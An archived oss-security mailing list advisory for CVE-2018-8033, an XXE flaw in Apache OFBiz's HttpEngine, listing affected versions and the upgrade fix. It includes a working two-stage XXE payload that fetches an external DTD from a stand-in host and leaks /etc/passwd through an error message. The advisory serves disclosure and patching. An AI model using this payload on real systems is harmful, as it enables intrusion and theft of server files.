X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1448" "Friday" "5" "October" "2018" "15:58:13" "+0300" "Taher Alkhateeb" "slidingfilaments@gmail.com" "<CAFqjAi154tZ3ZaMBs5FTHyJv8qp4PnyGMf_AcnYWuNg0woWvHw@mail.gmail.com>" "49" "[oss-security] [SECURITY] CVE-2018-8033 Apache OFBiz XXE Vulnerability in HttpEngine" "^Date:" nil nil "10" "2018100512:58:13" "[oss-security] [SECURITY] CVE-2018-8033 Apache OFBiz XXE Vulnerability in HttpEngine" (number mark "U       slidingfilam Oct  5   49/1448  " thread-indent "\"[oss-security] [SECURITY] CVE-2018-8033 Apache OFBiz XXE Vulnerability in HttpEngine\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 21789 invoked by uid 550); 5 Oct 2018 13:13:53 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 12260 invoked from network); 5 Oct 2018 12:58:37 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=u8Hrv1uzZsrFgHUp+IhJ6m0AN5dSJEjypw2gvi6o7WA=;
        b=rmt59V2mTNF+YSlUc3pCskkxquX9EngIi5LynJWfU4rbbWfUbS11T1equAT/Xc1neO
         /qp/kn95r4Z5zQSlFeSITa6B9TaqshDdAkfLusZCdZp1aufEnY6IuiUFe8BXYDRihdeL
         4dy9UdW7Uez7EpndFhm71oEtDC4KDpEu7NfjpdfTwzH3xJYiqGSNrQvDlQZHJpbhDDsX
         ecD8cTahBiSi1ZXZTFb4z9pFQqyGs/WIhHNmfQ4LWKO2vvIa4OBQ6HDmjYhXOpjR4ArN
         EzKYMk/dlUYKEBX+oce7xnKNJoZhzqn8YMr4sWVjvkXdNz9tR3EmAof/h1P3G3m0+kom
         v5Dw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=u8Hrv1uzZsrFgHUp+IhJ6m0AN5dSJEjypw2gvi6o7WA=;
        b=I/L/CgyVNx4rHGlGCapvN1hn+SYrkshLM/DOQ8VzKDkjbG7GAlINrMYf63836RiYY9
         k4h28Jt22YQZu+NyWPGqxL9uM2xvF4MyFyfjnvjGK35sPVpMiAwA6Y5s/DyBDXxf6O+v
         MGgmAmw5heZNYTV9DCIuFeqUBIUQFN7Twr7AxbjCVVeTKLTgpN/EOdfOos+eh5T376Jq
         ElGkCrEwLlDs1A35dlMTVXKYE4w40MkJ1uVZqFV/egotZArebn96C4rFQY3el4a9V5hG
         u8BGqZX9z8XOMLARJVzZZutnSgyJgACrR3zv7VcVg3W0cPP272pHhxgZD5MJ4gjZbuJa
         zFsQ==
X-Gm-Message-State: ABuFfojYqKyj6Dp0fQxmLISk5fewud2KUdmbmjJe68BDGqOpttL+G36S
	sk2iKo4FKoKNEnXdqeKE11Y48ikCLdCNlvD9P9w=
X-Google-Smtp-Source: ACcGV60N6xdfh2a0ISjWYzbRiLCwyXbtbAiKaSZx2HwaLsHrIlCRkq4GPw1Rn+cY9b7WmtOxKWXtJi14fPLv2yqIadA=
X-Received: by 2002:a0d:c184:: with SMTP id c126-v6mr5972845ywd.194.1538744304785;
 Fri, 05 Oct 2018 05:58:24 -0700 (PDT)
MIME-Version: 1.0
Message-ID: <CAFqjAi154tZ3ZaMBs5FTHyJv8qp4PnyGMf_AcnYWuNg0woWvHw@mail.gmail.com>
Content-Type: text/plain; charset="UTF-8"
Date: Fri, 5 Oct 2018 15:58:13 +0300
From: Taher Alkhateeb <slidingfilaments@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] [SECURITY] CVE-2018-8033 Apache OFBiz XXE Vulnerability in HttpEngine
To: OFBiz development mailing list <dev@ofbiz.apache.org>, OFBiz user mailing list <user@ofbiz.apache.org>, 
	OFBiz security mailing list <security@ofbiz.apache.org>, Apache Security Team <security@apache.org>, announce@apache.org, 
	oss-security@lists.openwall.com, James Parfet <jamesp@mindpointgroup.com>

Severity:
Important

Vendor:
The Apache Software Foundation

Versions Affected:
OFBiz 16.11.01 to 16.11.04

Description:
The OFBiz HTTP engine (org.apache.ofbiz.service.engine.HttpEngine.java)
handles requests for HTTP services via the /webtools/control/httpService
endpoint. Both POST and GET requests to the httpService endpoint may contain
three parameters: serviceName, serviceMode, and serviceContext.
The exploitation occurs by having DOCTYPEs pointing to external references
that trigger a payload that returns secret information from the host.

Mitigation:
Upgrade to 16.11.05
or manually apply the following commits on branch 16
r1833708
r1836141

Example:
# The following payload may be used:
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % request SYSTEM 'http://example.com/evil.xml'>
%request;
%secondstage;
]>
<r>&disclose;</r>

# And then the remote file evil.xml has the following payload:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % secondstage "<!ENTITY disclose SYSTEM 'file:///nonexistent/%file;'>">
%secondstage;
%disclose;

The second stage payload specifies what file to disclose on the OFBiz server.
It instructs the OFBiz server to look for a file in the path /nonexistent/.
The server will throw a "File Not Found" error and then append the target file
(/etc/passwd) to the error message.

Credit:
James Parfet <jamesp at mindpointgroup.com>

References:
http://ofbiz.apache.org/download.html#vulnerabilities
